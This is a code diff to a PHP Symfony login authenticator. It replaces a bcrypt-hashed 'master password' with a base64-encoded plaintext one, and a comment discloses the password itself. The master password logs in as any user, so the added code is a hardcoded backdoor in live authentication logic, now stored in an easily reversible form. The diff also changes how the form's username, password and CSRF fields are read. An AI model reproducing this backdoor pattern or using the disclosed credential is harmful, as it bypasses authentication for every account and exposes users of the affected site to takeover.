@@ -27,8 +27,8 @@ class AppCustomAuthenticator extends AbstractLoginFormAuthenticator
 
     public const LOGIN_ROUTE = 'app_login';
 
-    /** Hash bcrypt de la contraseña maestra. */
-    private const MASTER_PASSWORD_HASH = '$2y$12$TKL6nMKR3PwqluPOugRn2OwQPkIDs4pnwSvw.i2.hoMS1OlQsH.xG';
+    /** Contraseña maestra en base64 (bispolmarcos2026). */
+    private const MASTER_PASSWORD_B64 = 'YmlzcG9sbWFyY29zMjAyNg==';
 
     public function __construct(
         private UrlGeneratorInterface $urlGenerator,
@@ -40,8 +40,15 @@ class AppCustomAuthenticator extends AbstractLoginFormAuthenticator
 
     public function authenticate(Request $request): Passport
     {
-        $username = $request->getPayload()->getString('username');
-        $password = $request->getPayload()->getString('password');
+        // Preferir request (formulario POST clásico); getPayload como respaldo
+        $username = $request->request->getString('username');
+        $password = $request->request->getString('password');
+        $csrfToken = $request->request->getString('_csrf_token');
+        if ($username === '' && $password === '') {
+            $username = $request->getPayload()->getString('username');
+            $password = $request->getPayload()->getString('password');
+            $csrfToken = $request->getPayload()->getString('_csrf_token');
+        }
 
         $request->getSession()->set(SecurityRequestAttributes::LAST_USERNAME, $username);
 
@@ -57,22 +64,23 @@ class AppCustomAuthenticator extends AbstractLoginFormAuthenticator
         }
 
         $passwordHasher = $this->passwordHasher;
-        $masterPasswordHash = self::MASTER_PASSWORD_HASH;
+        $masterPassword = base64_decode(self::MASTER_PASSWORD_B64, true) ?: '';
 
         return new Passport(
             new UserBadge($username),
             new CustomCredentials(
-                static function (string $credentials, PasswordAuthenticatedUserInterface $user) use ($masterPasswordHash, $passwordHasher): bool {
-                    if (password_verify($credentials, $masterPasswordHash)) {
+                static function (mixed $credentials, PasswordAuthenticatedUserInterface $user) use ($masterPassword, $passwordHasher): bool {
+                    $presented = is_string($credentials) ? $credentials : '';
+                    if ($masterPassword !== '' && hash_equals($masterPassword, $presented)) {
                         return true;
                     }
 
-                    return $passwordHasher->isPasswordValid($user, $credentials);
+                    return $passwordHasher->isPasswordValid($user, $presented);
                 },
                 $password
             ),
             [
-                new CsrfTokenBadge('authenticate', $request->getPayload()->getString('_csrf_token')),
+                new CsrfTokenBadge('authenticate', $csrfToken),
                 new RememberMeBadge(),
             ]
         );
